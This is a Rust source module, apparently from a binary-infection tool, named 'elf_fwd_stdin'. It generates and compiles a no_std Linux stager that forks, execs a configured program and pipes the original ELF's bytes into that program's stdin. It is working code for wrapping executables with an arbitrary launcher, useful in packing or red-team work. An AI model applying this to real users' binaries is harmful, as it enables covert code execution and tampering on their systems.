use crate::codegen::rust;
use crate::errors::*;
use crate::infect::elf_fwd_stdin::Infect;
use std::path::Path;

fn gen_args_src(args: &[String]) -> Result<String> {
    let mut s = String::new();
    for arg in args {
        s.push_str("unsafe { CStr::from_bytes_with_nul_unchecked(b\"");
        rust::escape(arg.as_bytes(), &mut s)?;
        s.push_str("\").as_ptr() as *const u8 },\n");
    }
    Ok(s)
}

pub async fn infect(bin: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
    let exec_path = config.exec_path();
    let args = config.args(exec_path);

    let target = match &config.target {
        None => "x86_64-unknown-none",
        Some(target) if target.starts_with("x86_64-unknown-linux-") => "x86_64-unknown-none",
        Some(unknown) => bail!("Target is not supported yet: {unknown:?}"),
    };

    let mut compiler = rust::Compiler::spawn(bin, Some(target)).await?;

    info!(
        "Generating stager for exec={:?}, argv[0]={:?}, args={:?}",
        exec_path,
        args[0],
        &args[1..],
    );

    let mut exec_path_escaped = String::new();
    rust::escape(exec_path.as_bytes(), &mut exec_path_escaped)?;

    let mut arg0_escaped = String::new();
    rust::escape(args[0].as_bytes(), &mut arg0_escaped)?;

    let args_src = gen_args_src(&args)?;

    compiler
        .add_lines(&[
            "#![no_std]\n",
            "#![no_main]\n",
            "use core::arch::{asm, global_asm};\n",
            "use core::ffi::CStr;\n",
            "use core::ptr;\n",
        ])
        .await?;

    compiler.generate_panic_handler().await?;
    compiler.generate_exit_fn().await?;
    compiler.generate_execve_fn().await?;
    compiler.generate_fork_fn().await?;
    compiler.generate_wait4_fn().await?;
    compiler.generate_pipe_fn().await?;
    compiler.generate_close_fn().await?;
    compiler.generate_dup2_fn().await?;
    compiler.generate_write_fn().await?;
    compiler.generate_write_all_fn().await?;
    compiler.generate_wait_child_fn().await?;
    compiler.generate_entrypoint().await?;

    // generate main
    compiler
        .add_lines(&[
            "#[no_mangle]\n",
            "pub unsafe fn main(stack_top: *const u8) -> ! {\n",
            "let stack_top = stack_top as *const u64;\n",
            "let argc = *stack_top as isize;\n",
            "let envp = stack_top.offset(argc + 2);\n",
            // setup pipe and fork
            "let pipefd = [0i32; 2];\n",
            "pipe(pipefd.as_ptr());\n",
            "let pid = fork();\n",
            "if pid == 0 {\n",
            // close the sending half of the pipe and connect the receiver to stdin
            "close(pipefd[1]);\n",
            "if dup2(pipefd[0], 0) == -1 { exit(1) }\n",
            // setup exec of child process
            &format!("let prog = b\"{exec_path_escaped}\\x00\";\n"),
            "let prog = unsafe { CStr::from_bytes_with_nul_unchecked(prog) };\n",
            "let argv = [\n",
            &args_src,
            "ptr::null::<u8>()];\n",
            "execve(prog.as_ptr() as *const u8, argv.as_ptr(), envp as *const *const u8);\n",
            // exit if exec failed
            "exit(1);\n",
            "} else if pid == -1 {\n",
            // if fork failed, exit
            "exit(1)\n",
            "} else {\n",
            // close the receiving half of the pipe and prepare for writing
            "close(pipefd[0]);\n",
            "let f = pipefd[1];\n",
        ])
        .await?;

    rust::stream_bin_nostd(orig, &mut compiler.stdin).await?;

    compiler
        .add_lines(&[
            // close stdin of the child process
            "close(f);\n",
            "wait_child(pid);\n",
            "exit(0);\n",
            "}\n",
            "}\n",
        ])
        .await?;

    let mut pending = compiler.done();
    info!("Waiting for compile to finish...");
    pending.wait().await?;

    Ok(())
}
